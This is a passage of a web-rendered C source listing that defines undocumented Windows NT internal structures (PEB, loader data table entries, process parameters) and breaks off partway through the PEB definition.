class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br><span class="line">134</span><br><span class="line">135</span><br><span class="line">136</span><br><span class="line">137</span><br><span class="line">138</span><br><span class="line">139</span><br><span class="line">140</span><br><span class="line">141</span><br><span class="line">142</span><br><span class="line">143</span><br><span class="line">144</span><br><span class="line">145</span><br><span class="line">146</span><br><span class="line">147</span><br><span class="line">148</span><br><span class="line">149</span><br><span class="line">150</span><br><span class="line">151</span><br><span class="line">152</span><br><span class="line">153</span><br><span class="line">154</span><br><span class="line">155</span><br><span class="line">156</span><br><span class="line">157</span><br><span class="line">158</span><br><span class="line">159</span><br><span class="line">160</span><br><span class="line">161</span><br><span class="line">162</span><br><span class="line">163</span><br><span class="line">164</span><br><span class="line">165</span><br><span class="line">166</span><br><span class="line">167</span><br><span class="line">168</span><br><span class="line">169</span><br><span class="line">170</span><br><span class="line">171</span><br><span class="line">172</span><br><span class="line">173</span><br><span class="line">174</span><br><span class="line">175</span><br><span class="line">176</span><br><span class="line">177</span><br><span class="line">178</span><br><span class="line">179</span><br><span class="line">180</span><br><span class="line">181</span><br><span class="line">182</span><br><span class="line">183</span><br><span class="line">184</span><br><span class="line">185</span><br><span class="line">186</span><br><span class="line">187</span><br><span class="line">188</span><br><span class="line">189</span><br><span class="line">190</span><br><span class="line">191</span><br><span class="line">192</span><br><span class="line">193</span><br><span class="line">194</span><br><span class="line">195</span><br><span class="line">196</span><br><span class="line">197</span><br><span class="line">198</span><br><span class="line">199</span><br><span class="line">200</span><br><span class="line">201</span><br><span class="line">202</span><br><span class="line">203</span><br><span class="line">204</span><br><span class="line">205</span><br><span class="line">206</span><br><span class="line">207</span><br><span class="line">208</span><br><span class="line">209</span><br><span class="line">210</span><br><span class="line">211</span><br><span class="line">212</span><br><span class="line">213</span><br><span class="line">214</span><br><span class="line">215</span><br><span class="line">216</span><br><span class="line">217</span><br><span class="line">218</span><br><span class="line">219</span><br><span class="line">220</span><br><span class="line">221</span><br><span class="line">222</span><br><span class="line">223</span><br><span class="line">224</span><br><span class="line">225</span><br><span class="line">226</span><br><span class="line">227</span><br><span class="line">228</span><br><span class="line">229</span><br><span class="line">230</span><br><span class="line">231</span><br><span class="line">232</span><br><span class="line">233</span><br><span class="line">234</span><br><span class="line">235</span><br><span class="line">236</span><br><span class="line">237</span><br><span class="line">238</span><br><span class="line">239</span><br><span class="line">240</span><br><span class="line">241</span><br><span class="line">242</span><br><span class="line">243</span><br><span class="line">244</span><br><span class="line">245</span><br><span class="line">246</span><br><span class="line">247</span><br><span class="line">248</span><br><span class="line">249</span><br><span class="line">250</span><br><span class="line">251</span><br><span class="line">252</span><br><span class="line">253</span><br><span class="line">254</span><br><span class="line">255</span><br><span class="line">256</span><br><span class="line">257</span><br><span class="line">258</span><br><span class="line">259</span><br><span class="line">260</span><br><span class="line">261</span><br><span class="line">262</span><br><span class="line">263</span><br><span class="line">264</span><br><span class="line">265</span><br><span class="line">266</span><br><span class="line">267</span><br><span class="line">268</span><br><span class="line">269</span><br><span class="line">270</span><br><span class="line">271</span><br><span class="line">272</span><br><span class="line">273</span><br><span class="line">274</span><br><span class="line">275</span><br><span class="line">276</span><br><span class="line">277</span><br><span class="line">278</span><br><span class="line">279</span><br><span class="line">280</span><br><span class="line">281</span><br><span class="line">282</span><br><span class="line">283</span><br><span class="line">284</span><br><span class="line">285</span><br><span class="line">286</span><br><span class="line">287</span><br><span class="line">288</span><br><span class="line">289</span><br><span class="line">290</span><br><span class="line">291</span><br><span class="line">292</span><br><span class="line">293</span><br><span class="line">294</span><br><span class="line">295</span><br><span class="line">296</span><br><span class="line">297</span><br><span class="line">298</span><br><span class="line">299</span><br><span class="line">300</span><br><span class="line">301</span><br><span class="line">302</span><br><span class="line">303</span><br><span class="line">304</span><br><span class="line">305</span><br><span class="line">306</span><br><span class="line">307</span><br><span class="line">308</span><br><span class="line">309</span><br><span class="line">310</span><br><span class="line">311</span><br><span class="line">312</span><br><span class="line">313</span><br><span class="line">314</span><br><span class="line">315</span><br><span class="line">316</span><br><span class="line">317</span><br><span class="line">318</span><br><span class="line">319</span><br><span class="line">320</span><br><span class="line">321</span><br><span class="line">322</span><br><span class="line">323</span><br><span class="line">324</span><br><span class="line">325</span><br><span class="line">326</span><br><span class="line">327</span><br><span class="line">328</span><br><span class="line">329</span><br><span class="line">330</span><br><span class="line">331</span><br><span class="line">332</span><br><span class="line">333</span><br><span class="line">334</span><br><span class="line">335</span><br><span class="line">336</span><br><span class="line">337</span><br><span class="line">338</span><br><span class="line">339</span><br><span class="line">340</span><br><span class="line">341</span><br><span class="line">342</span><br><span class="line">343</span><br><span class="line">344</span><br><span class="line">345</span><br><span class="line">346</span><br><span class="line">347</span><br><span class="line">348</span><br><span class="line">349</span><br><span class="line">350</span><br><span class="line">351</span><br><span class="line">352</span><br><span class="line">353</span><br><span class="line">354</span><br><span class="line">355</span><br><span class="line">356</span><br><span class="line">357</span><br><span class="line">358</span><br><span class="line">359</span><br><span class="line">360</span><br><span class="line">361</span><br><span class="line">362</span><br><span class="line">363</span><br><span class="line">364</span><br><span class="line">365</span><br><span class="line">366</span><br><span class="line">367</span><br><span class="line">368</span><br><span class="line">369</span><br><span class="line">370</span><br><span class="line">371</span><br><span class="line">372</span><br><span class="line">373</span><br><span class="line">374</span><br><span class="line">375</span><br><span class="line">376</span><br><span class="line">377</span><br><span class="line">378</span><br><span class="line">379</span><br><span class="line">380</span><br><span class="line">381</span><br><span class="line">382</span><br><span class="line">383</span><br><span class="line">384</span><br><span class="line">385</span><br><span class="line">386</span><br><span class="line">387</span><br><span class="line">388</span><br><span class="line">389</span><br><span class="line">390</span><br><span class="line">391</span><br><span class="line">392</span><br><span class="line">393</span><br><span class="line">394</span><br><span class="line">395</span><br><span class="line">396</span><br><span class="line">397</span><br><span class="line">398</span><br><span class="line">399</span><br><span class="line">400</span><br><span class="line">401</span><br><span class="line">402</span><br><span class="line">403</span><br><span class="line">404</span><br><span class="line">405</span><br><span class="line">406</span><br><span class="line">407</span><br><span class="line">408</span><br><span class="line">409</span><br><span class="line">410</span><br><span class="line">411</span><br><span class="line">412</span><br><span class="line">413</span><br><span class="line">414</span><br><span class="line">415</span><br><span class="line">416</span><br><span class="line">417</span><br><span class="line">418</span><br><span class="line">419</span><br><span class="line">420</span><br><span class="line">421</span><br><span class="line">422</span><br><span class="line">423</span><br><span class="line">424</span><br><span class="line">425</span><br><span class="line">426</span><br><span class="line">427</span><br><span class="line">428</span><br><span class="line">429</span><br><span class="line">430</span><br><span class="line">431</span><br><span class="line">432</span><br><span class="line">433</span><br><span class="line">434</span><br><span class="line">435</span><br><span class="line">436</span><br><span class="line">437</span><br><span class="line">438</span><br><span class="line">439</span><br><span class="line">440</span><br><span class="line">441</span><br><span class="line">442</span><br><span class="line">443</span><br><span class="line">444</span><br><span class="line">445</span><br><span class="line">446</span><br><span class="line">447</span><br><span class="line">448</span><br><span class="line">449</span><br><span class="line">450</span><br><span class="line">451</span><br><span class="line">452</span><br><span class="line">453</span><br><span class="line">454</span><br><span class="line">455</span><br><span class="line">456</span><br><span class="line">457</span><br><span class="line">458</span><br><span class="line">459</span><br><span class="line">460</span><br><span class="line">461</span><br><span class="line">462</span><br><span class="line">463</span><br><span class="line">464</span><br><span class="line">465</span><br><span class="line">466</span><br><span class="line">467</span><br><span class="line">468</span><br><span class="line">469</span><br><span class="line">470</span><br><span class="line">471</span><br><span class="line">472</span><br><span class="line">473</span><br><span class="line">474</span><br><span class="line">475</span><br><span class="line">476</span><br><span class="line">477</span><br><span class="line">478</span><br><span class="line">479</span><br><span class="line">480</span><br><span class="line">481</span><br><span class="line">482</span><br><span class="line">483</span><br><span class="line">484</span><br><span class="line">485</span><br><span class="line">486</span><br><span class="line">487</span><br><span class="line">488</span><br><span class="line">489</span><br><span class="line">490</span><br><span class="line">491</span><br><span class="line">492</span><br><span class="line">493</span><br><span class="line">494</span><br><span class="line">495</span><br><span class="line">496</span><br><span class="line">497</span><br><span class="line">498</span><br><span class="line">499</span><br><span class="line">500</span><br><span class="line">501</span><br><span class="line">502</span><br><span class="line">503</span><br><span class="line">504</span><br><span class="line">505</span><br><span class="line">506</span><br><span class="line">507</span><br><span class="line">508</span><br><span class="line">509</span><br><span class="line">510</span><br><span class="line">511</span><br><span class="line">512</span><br><span class="line">513</span><br><span class="line">514</span><br><span class="line">515</span><br><span class="line">516</span><br><span class="line">517</span><br><span class="line">518</span><br><span class="line">519</span><br><span class="line">520</span><br><span class="line">521</span><br><span class="line">522</span><br><span class="line">523</span><br><span class="line">524</span><br><span class="line">525</span><br><span class="line">526</span><br><span class="line">527</span><br><span class="line">528</span><br><span class="line">529</span><br><span class="line">530</span><br><span class="line">531</span><br><span class="line">532</span><br><span class="line">533</span><br><span class="line">534</span><br><span class="line">535</span><br><span class="line">536</span><br><span class="line">537</span><br><span class="line">538</span><br><span class="line">539</span><br><span class="line">540</span><br><span class="line">541</span><br><span class="line">542</span><br><span class="line">543</span><br><span class="line">544</span><br><span class="line">545</span><br><span class="line">546</span><br><span class="line">547</span><br><span class="line">548</span><br><span class="line">549</span><br><span class="line">550</span><br><span class="line">551</span><br><span class="line">552</span><br><span class="line">553</span><br><span class="line">554</span><br><span class="line">555</span><br><span class="line">556</span><br><span class="line">557</span><br><span class="line">558</span><br><span class="line">559</span><br><span class="line">560</span><br><span class="line">561</span><br><span class="line">562</span><br><span class="line">563</span><br><span class="line">564</span><br><span class="line">565</span><br><span class="line">566</span><br><span class="line">567</span><br><span class="line">568</span><br><span class="line">569</span><br><span class="line">570</span><br><span class="line">571</span><br><span class="line">572</span><br><span class="line">573</span><br><span class="line">574</span><br><span class="line">575</span><br><span class="line">576</span><br><span class="line">577</span><br><span class="line">578</span><br><span class="line">579</span><br><span class="line">580</span><br><span class="line">581</span><br><span class="line">582</span><br><span class="line">583</span><br><span class="line">584</span><br><span class="line">585</span><br><span class="line">586</span><br><span class="line">587</span><br><span class="line">588</span><br><span class="line">589</span><br><span class="line">590</span><br><span class="line">591</span><br><span class="line">592</span><br><span class="line">593</span><br><span class="line">594</span><br><span class="line">595</span><br><span class="line">596</span><br><span class="line">597</span><br><span class="line">598</span><br><span class="line">599</span><br><span class="line">600</span><br><span class="line">601</span><br><span class="line">602</span><br><span class="line">603</span><br><span class="line">604</span><br><span class="line">605</span><br><span class="line">606</span><br><span class="line">607</span><br><span class="line">608</span><br><span class="line">609</span><br><span class="line">610</span><br><span class="line">611</span><br><span class="line">612</span><br><span class="line">613</span><br><span class="line">614</span><br><span class="line">615</span><br><span class="line">616</span><br><span class="line">617</span><br><span class="line">618</span><br><span class="line">619</span><br><span class="line">620</span><br><span class="line">621</span><br><span class="line">622</span><br><span class="line">623</span><br><span class="line">624</span><br><span class="line">625</span><br><span class="line">626</span><br><span class="line">627</span><br><span class="line">628</span><br><span class="line">629</span><br><span class="line">630</span><br><span class="line">631</span><br><span class="line">632</span><br><span class="line">633</span><br><span class="line">634</span><br><span class="line">635</span><br><span class="line">636</span><br><span class="line">637</span><br><span class="line">638</span><br><span class="line">639</span><br><span class="line">640</span><br><span class="line">641</span><br><span class="line">642</span><br><span class="line">643</span><br><span class="line">644</span><br><span class="line">645</span><br><span class="line">646</span><br><span class="line">647</span><br><span class="line">648</span><br><span class="line">649</span><br><span class="line">650</span><br><span class="line">651</span><br><span class="line">652</span><br><span class="line">653</span><br><span class="line">654</span><br><span class="line">655</span><br><span class="line">656</span><br><span class="line">657</span><br><span class="line">658</span><br><span class="line">659</span><br><span class="line">660</span><br><span class="line">661</span><br><span class="line">662</span><br><span class="line">663</span><br><span class="line">664</span><br><span class="line">665</span><br><span class="line">666</span><br><span class="line">667</span><br><span class="line">668</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;windows.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;shobjidl.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> RTL_MAX_DRIVE_LETTERS 32</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> GDI_HANDLE_BUFFER_SIZE32  34</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> GDI_HANDLE_BUFFER_SIZE64  60</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> GDI_BATCH_BUFFER_SIZE 310</span></span><br><span class="line"></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> NtCurrentProcess() ( (HANDLE)(LONG_PTR) -1 )</span></span><br><span class="line"><span class="meta">#<span class="keyword">ifndef</span> NT_SUCCESS</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> NT_SUCCESS(Status) (((NTSTATUS)(Status)) &gt;= 0)</span></span><br><span class="line"><span class="meta">#<span class="keyword">endif</span></span></span><br><span class="line"></span><br><span class="line"><span class="meta">#<span class="keyword">if</span> !defined(_M_X64)</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> GDI_HANDLE_BUFFER_SIZE      GDI_HANDLE_BUFFER_SIZE32</span></span><br><span class="line"><span class="meta">#<span class="keyword">else</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> GDI_HANDLE_BUFFER_SIZE      GDI_HANDLE_BUFFER_SIZE64</span></span><br><span class="line"><span class="meta">#<span class="keyword">endif</span></span></span><br><span class="line"></span><br><span class="line"><span class="keyword">typedef</span> ULONG GDI_HANDLE_BUFFER32[GDI_HANDLE_BUFFER_SIZE32];</span><br><span class="line"><span class="keyword">typedef</span> ULONG GDI_HANDLE_BUFFER64[GDI_HANDLE_BUFFER_SIZE64];</span><br><span class="line"><span class="keyword">typedef</span> ULONG GDI_HANDLE_BUFFER[GDI_HANDLE_BUFFER_SIZE];</span><br><span class="line"></span><br><span class="line"><span class="keyword">typedef</span> <span class="class"><span class="keyword">struct</span> _<span class="title">UNICODE_STRING</span> &#123;</span></span><br><span class="line">    USHORT Length;</span><br><span class="line">    USHORT MaximumLength;</span><br><span class="line">    PWSTR  Buffer;</span><br><span class="line">&#125; UNICODE_STRING;</span><br><span class="line"><span class="keyword">typedef</span> UNICODE_STRING* PUNICODE_STRING;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">typedef</span> <span class="class"><span class="keyword">struct</span> _<span class="title">STRING</span> &#123;</span></span><br><span class="line">    USHORT Length;</span><br><span class="line">    USHORT MaximumLength;</span><br><span class="line">    PCHAR Buffer;</span><br><span class="line">&#125; STRING;</span><br><span class="line"><span class="keyword">typedef</span> STRING* PSTRING;</span><br><span class="line"></span><br><span class="line"><span class="keyword">typedef</span> <span class="class"><span class="keyword">struct</span> _<span class="title">CLIENT_ID</span> &#123;</span></span><br><span class="line">    HANDLE UniqueProcess;</span><br><span class="line">    HANDLE UniqueThread;</span><br><span class="line">&#125; CLIENT_ID, * PCLIENT_ID;</span><br><span class="line"></span><br><span class="line"><span class="keyword">typedef</span> <span class="class"><span class="keyword">struct</span> _<span class="title">CLIENT_ID64</span> &#123;</span></span><br><span class="line">    ULONG64 UniqueProcess;</span><br><span class="line">    ULONG64 UniqueThread;</span><br><span class="line">&#125; CLIENT_ID64, * PCLIENT_ID64;</span><br><span class="line"></span><br><span class="line"><span class="keyword">typedef</span> <span class="class"><span class="keyword">struct</span> _<span class="title">LDR_DATA_TABLE_ENTRY_COMPATIBLE</span> &#123;</span></span><br><span class="line">    LIST_ENTRY InLoadOrderLinks;</span><br><span class="line">    LIST_ENTRY InMemoryOrderLinks;</span><br><span class="line">    <span class="class"><span class="keyword">union</span></span></span><br><span class="line"><span class="class">    &#123;</span></span><br><span class="line">        LIST_ENTRY InInitializationOrderLinks;</span><br><span class="line">        LIST_ENTRY InProgressLinks;</span><br><span class="line">    &#125; DUMMYUNION0;</span><br><span class="line">    PVOID DllBase;</span><br><span class="line">    PVOID EntryPoint;</span><br><span class="line">    ULONG SizeOfImage;</span><br><span class="line">    UNICODE_STRING FullDllName;</span><br><span class="line">    UNICODE_STRING BaseDllName;</span><br><span class="line">    <span class="class"><span class="keyword">union</span></span></span><br><span class="line"><span class="class">    &#123;</span></span><br><span class="line">        ULONG Flags;</span><br><span class="line">        <span class="class"><span class="keyword">struct</span></span></span><br><span class="line"><span class="class">        &#123;</span></span><br><span class="line">            ULONG PackagedBinary : <span class="number">1</span>; <span class="comment">// Size=4 Offset=104 BitOffset=0 BitCount=1</span></span><br><span class="line">            ULONG MarkedForRemoval : <span class="number">1</span>; <span class="comment">// Size=4 Offset=104 BitOffset=1 BitCount=1</span></span><br><span class="line">            ULONG ImageDll : <span class="number">1</span>; <span class="comment">// Size=4 Offset=104 BitOffset=2 BitCount=1</span></span><br><span class="line">            ULONG LoadNotificationsSent : <span class="number">1</span>; <span class="comment">// Size=4 Offset=104 BitOffset=3 BitCount=1</span></span><br><span class="line">            ULONG TelemetryEntryProcessed : <span class="number">1</span>; <span class="comment">// Size=4 Offset=104 BitOffset=4 BitCount=1</span></span><br><span class="line">            ULONG ProcessStaticImport : <span class="number">1</span>; <span class="comment">// Size=4 Offset=104 BitOffset=5 BitCount=1</span></span><br><span class="line">            ULONG InLegacyLists : <span class="number">1</span>; <span class="comment">// Size=4 Offset=104 BitOffset=6 BitCount=1</span></span><br><span class="line">            ULONG InIndexes : <span class="number">1</span>; <span class="comment">// Size=4 Offset=104 BitOffset=7 BitCount=1</span></span><br><span class="line">            ULONG ShimDll : <span class="number">1</span>; <span class="comment">// Size=4 Offset=104 BitOffset=8 BitCount=1</span></span><br><span class="line">            ULONG InExceptionTable : <span class="number">1</span>; <span class="comment">// Size=4 Offset=104 BitOffset=9 BitCount=1</span></span><br><span class="line">            ULONG ReservedFlags1 : <span class="number">2</span>; <span class="comment">// Size=4 Offset=104 BitOffset=10 BitCount=2</span></span><br><span class="line">            ULONG LoadInProgress : <span class="number">1</span>; <span class="comment">// Size=4 Offset=104 BitOffset=12 BitCount=1</span></span><br><span class="line">            ULONG LoadConfigProcessed : <span class="number">1</span>; <span class="comment">// Size=4 Offset=104 BitOffset=13 BitCount=1</span></span><br><span class="line">            ULONG EntryProcessed : <span class="number">1</span>; <span class="comment">// Size=4 Offset=104 BitOffset=14 BitCount=1</span></span><br><span class="line">            ULONG ProtectDelayLoad : <span class="number">1</span>; <span class="comment">// Size=4 Offset=104 BitOffset=15 BitCount=1</span></span><br><span class="line">            ULONG ReservedFlags3 : <span class="number">2</span>; <span class="comment">// Size=4 Offset=104 BitOffset=16 BitCount=2</span></span><br><span class="line">            ULONG DontCallForThreads : <span class="number">1</span>; <span class="comment">// Size=4 Offset=104 BitOffset=18 BitCount=1</span></span><br><span class="line">            ULONG ProcessAttachCalled : <span class="number">1</span>; <span class="comment">// Size=4 Offset=104 BitOffset=19 BitCount=1</span></span><br><span class="line">            ULONG ProcessAttachFailed : <span class="number">1</span>; <span class="comment">// Size=4 Offset=104 BitOffset=20 BitCount=1</span></span><br><span class="line">            ULONG CorDeferredValidate : <span class="number">1</span>; <span class="comment">// Size=4 Offset=104 BitOffset=21 BitCount=1</span></span><br><span class="line">            ULONG CorImage : <span class="number">1</span>; <span class="comment">// Size=4 Offset=104 BitOffset=22 BitCount=1</span></span><br><span class="line">            ULONG DontRelocate : <span class="number">1</span>; <span class="comment">// Size=4 Offset=104 BitOffset=23 BitCount=1</span></span><br><span class="line">            ULONG CorILOnly : <span class="number">1</span>; <span class="comment">// Size=4 Offset=104 BitOffset=24 BitCount=1</span></span><br><span class="line">            ULONG ChpeImage : <span class="number">1</span>; <span class="comment">// Size=4 Offset=104 BitOffset=25 BitCount=1</span></span><br><span class="line">            ULONG ReservedFlags5 : <span class="number">2</span>; <span class="comment">// Size=4 Offset=104 BitOffset=26 BitCount=2</span></span><br><span class="line">            ULONG Redirected : <span class="number">1</span>; <span class="comment">// Size=4 Offset=104 BitOffset=28 BitCount=1</span></span><br><span class="line">            ULONG ReservedFlags6 : <span class="number">2</span>; <span class="comment">// Size=4 Offset=104 BitOffset=29 BitCount=2</span></span><br><span class="line">            ULONG CompatDatabaseProcessed : <span class="number">1</span>; <span class="comment">// Size=4 Offset=104 BitOffset=31 BitCount=1</span></span><br><span class="line">        &#125;;</span><br><span class="line">    &#125; ENTRYFLAGSUNION;</span><br><span class="line">    WORD ObsoleteLoadCount;</span><br><span class="line">    WORD TlsIndex;</span><br><span class="line">    <span class="class"><span class="keyword">union</span></span></span><br><span class="line"><span class="class">    &#123;</span></span><br><span class="line">        LIST_ENTRY HashLinks;</span><br><span class="line">        <span class="class"><span class="keyword">struct</span></span></span><br><span class="line"><span class="class">        &#123;</span></span><br><span class="line">            PVOID SectionPointer;</span><br><span class="line">            ULONG CheckSum;</span><br><span class="line">        &#125;;</span><br><span class="line">    &#125; DUMMYUNION1;</span><br><span class="line">    <span class="class"><span class="keyword">union</span></span></span><br><span class="line"><span class="class">    &#123;</span></span><br><span class="line">        ULONG TimeDateStamp;</span><br><span class="line">        PVOID LoadedImports;</span><br><span class="line">    &#125; DUMMYUNION2;</span><br><span class="line">    <span class="comment">//fields below removed for compatibility</span></span><br><span class="line">&#125; LDR_DATA_TABLE_ENTRY_COMPATIBLE, * PLDR_DATA_TABLE_ENTRY_COMPATIBLE;</span><br><span class="line"><span class="keyword">typedef</span> LDR_DATA_TABLE_ENTRY_COMPATIBLE LDR_DATA_TABLE_ENTRY;</span><br><span class="line"></span><br><span class="line"><span class="keyword">typedef</span> LDR_DATA_TABLE_ENTRY* PCLDR_DATA_TABLE_ENTRY;</span><br><span class="line"></span><br><span class="line"><span class="keyword">typedef</span> <span class="class"><span class="keyword">struct</span> _<span class="title">PEB_LDR_DATA</span> &#123;</span></span><br><span class="line">    ULONG Length;</span><br><span class="line">    BOOLEAN Initialized;</span><br><span class="line">    HANDLE SsHandle;</span><br><span class="line">    LIST_ENTRY InLoadOrderModuleList;</span><br><span class="line">    LIST_ENTRY InMemoryOrderModuleList;</span><br><span class="line">    LIST_ENTRY InInitializationOrderModuleList;</span><br><span class="line">    PVOID EntryInProgress;</span><br><span class="line">    BOOLEAN ShutdownInProgress;</span><br><span class="line">    HANDLE ShutdownThreadId;</span><br><span class="line">&#125; PEB_LDR_DATA, * PPEB_LDR_DATA;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">typedef</span> <span class="class"><span class="keyword">struct</span> _<span class="title">CURDIR</span> &#123;</span></span><br><span class="line">    UNICODE_STRING DosPath;</span><br><span class="line">    HANDLE Handle;</span><br><span class="line">&#125; CURDIR, * PCURDIR;</span><br><span class="line"></span><br><span class="line"><span class="keyword">typedef</span> <span class="class"><span class="keyword">struct</span> _<span class="title">RTL_DRIVE_LETTER_CURDIR</span> &#123;</span></span><br><span class="line">    USHORT Flags;</span><br><span class="line">    USHORT Length;</span><br><span class="line">    ULONG TimeStamp;</span><br><span class="line">    STRING DosPath;</span><br><span class="line">&#125; RTL_DRIVE_LETTER_CURDIR, * PRTL_DRIVE_LETTER_CURDIR;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">typedef</span> <span class="class"><span class="keyword">struct</span> _<span class="title">RTL_USER_PROCESS_PARAMETERS</span> &#123;</span></span><br><span class="line">    ULONG MaximumLength;</span><br><span class="line">    ULONG Length;</span><br><span class="line"></span><br><span class="line">    ULONG Flags;</span><br><span class="line">    ULONG DebugFlags;</span><br><span class="line"></span><br><span class="line">    HANDLE ConsoleHandle;</span><br><span class="line">    ULONG ConsoleFlags;</span><br><span class="line">    HANDLE StandardInput;</span><br><span class="line">    HANDLE StandardOutput;</span><br><span class="line">    HANDLE StandardError;</span><br><span class="line"></span><br><span class="line">    CURDIR CurrentDirectory;</span><br><span class="line">    UNICODE_STRING DllPath;</span><br><span class="line">    UNICODE_STRING ImagePathName;</span><br><span class="line">    UNICODE_STRING CommandLine;</span><br><span class="line">    PVOID Environment;</span><br><span class="line"></span><br><span class="line">    ULONG StartingX;</span><br><span class="line">    ULONG StartingY;</span><br><span class="line">    ULONG CountX;</span><br><span class="line">    ULONG CountY;</span><br><span class="line">    ULONG CountCharsX;</span><br><span class="line">    ULONG CountCharsY;</span><br><span class="line">    ULONG FillAttribute;</span><br><span class="line"></span><br><span class="line">    ULONG WindowFlags;</span><br><span class="line">    ULONG ShowWindowFlags;</span><br><span class="line">    UNICODE_STRING WindowTitle;</span><br><span class="line">    UNICODE_STRING DesktopInfo;</span><br><span class="line">    UNICODE_STRING ShellInfo;</span><br><span class="line">    UNICODE_STRING RuntimeData;</span><br><span class="line">    RTL_DRIVE_LETTER_CURDIR CurrentDirectories[RTL_MAX_DRIVE_LETTERS];</span><br><span class="line"></span><br><span class="line">    ULONG EnvironmentSize;</span><br><span class="line">    ULONG EnvironmentVersion;</span><br><span class="line">    PVOID PackageDependencyData; <span class="comment">//8+</span></span><br><span class="line">    ULONG ProcessGroupId;</span><br><span class="line">    <span class="comment">// ULONG LoaderThreads;</span></span><br><span class="line">&#125; RTL_USER_PROCESS_PARAMETERS, * PRTL_USER_PROCESS_PARAMETERS;</span><br><span class="line"></span><br><span class="line"><span class="keyword">typedef</span> <span class="class"><span class="keyword">struct</span> _<span class="title">PEB</span> &#123;</span></span><br><span class="line">    BOOLEAN InheritedAddressSpace;</span><br><span class="line">    BOOLEAN ReadImageFileExecOptions;</span><br><span class="line">    BOOLEAN BeingDebugged;</span><br><span class="line">    <span class="class"><span class="keyword">union</span></span></span><br><span class="line"><span class="class">    &#123;</span></span><br><span class="line">        BOOLEAN BitField;</span><br><span class="line">        <span class="class"><span class="keyword">struct</span></span></span><br><span class="line"><span class="class">        &#123;</span></span><br><span class="line">            BOOLEAN ImageUsesLargePages : <span class="number">1</span>;</span><br><span class="line">            BOOLEAN IsProtectedProcess : <span class="number">1</span>;</span><br><span class="line">            BOOLEAN IsImageDynamicallyRelocated : <span class="number">1</span>;</span><br><span class="line">            BOOLEAN SkipPatchingUser32Forwarders : <span class="number">1</span>;</span><br><span class="line">            BOOLEAN IsPackagedProcess : <span class="number">1</span>;</span><br><span class="line">            BOOLEAN IsAppContainer : <span class="number">1</span>;</span><br><span class="line">            BOOLEAN IsProtectedProcessLight : <span class="number">1</span>;</span><br><span class="line">            BOOLEAN IsLongPathAwareProcess : <span class="number">1</span>;</span><br><span class="line">        &#125;;</span><br><span class="line">    &#125;;</span><br><span class="line">    HANDLE Mutant;</span><br><span class="line"></span><br><span class="line">    PVOID ImageBaseAddress;</span><br><span class="line">    PPEB_LDR_DATA Ldr;</span><br><span class="line">    PRTL_USER_PROCESS_PARAMETERS ProcessParameters;</span><br><span class="line">    PVOID SubSystemData;</span><br><span class="line">    PVOID ProcessHeap;</span><br><span class="line">    PRTL_CRITICAL_SECTION FastPebLock;</span><br><span class="line">    PVOID AtlThunkSListPtr;</span><br><span class="line">    PVOID IFEOKey;</span><br><span class="line">    <span class="class"><span class="keyword">union</span></span></span><br><span class="line"><span class="class">    &#123;</span></span><br><span class="line">        ULONG CrossProcessFlags;</span><br><span class="line">        <span class="class"><span class="keyword">struct</span></span></span><br><span class="line"><span class="class">        &#123;</span></span><br><span class="line">            ULONG ProcessInJob : <span class="number">1</span>;</span><br><span class="line">            ULONG ProcessInitializing : <span class="number">1</span>;</span><br><span class="line">            ULONG ProcessUsingVEH : <span class="number">1</span>;</span><br><span class="line">            ULONG ProcessUsingVCH : <span class="number">1</span>;</span><br><span class="line">            ULONG ProcessUsingFTH : <span class="number">1</span>;</span><br><span class="line">            ULONG ProcessPreviouslyThrottled : <span class="number">1</span>;</span><br><span class="line">            ULONG ProcessCurrentlyThrottled : <span class="number">1</span>;</span><br><span class="line">            ULONG ReservedBits0 : <span class="number">25</span>;</span><br><span class="line">        &#125;;</span><br><span class="line">        ULONG EnvironmentUpdateCount;</span><br><span class="line">    &#125;;</span><br><span class="line">    <span class="class"><span class="keyword">union</span></span></span><br><span class="line"><span class="class">    &#123;</span></span><br><span class="line">        PVOID KernelCallbackTable;</span><br><span class="line">        PVOID UserSharedInfoPtr;</span><br><span class="line">    &#125;;</span><br><span class="line">    ULONG SystemReserved[<span class="number">1</span>];</span><br><span class="line">    ULONG AtlThunkSListPtr32;</span><br><span class="line">    PVOID ApiSetMap;</span><br><span class="line">    ULONG TlsExpansionCounter;</span><br><span class="line">    PVOID TlsBitmap;</span><br><span class="line">    ULONG TlsBitmapBits[<span class="number">2</span>];</span><br><span class="line">    PVOID ReadOnlySharedMemoryBase;</span><br><span class="line">    PVOID HotpatchInformation;</span><br><span class="line">    PVOID* ReadOnlyStaticServerData;</span><br><span class="line">    PVOID AnsiCodePageData;</span><br><span class="line">    PVOID OemCodePageData;</span><br><span class="line">    PVOID UnicodeCaseTableData;</span><br><span class="line"></span><br><span class="line">    ULONG NumberOfProcessors;</span><br><span class="line">    ULONG NtGlobalFlag;</span><br><span 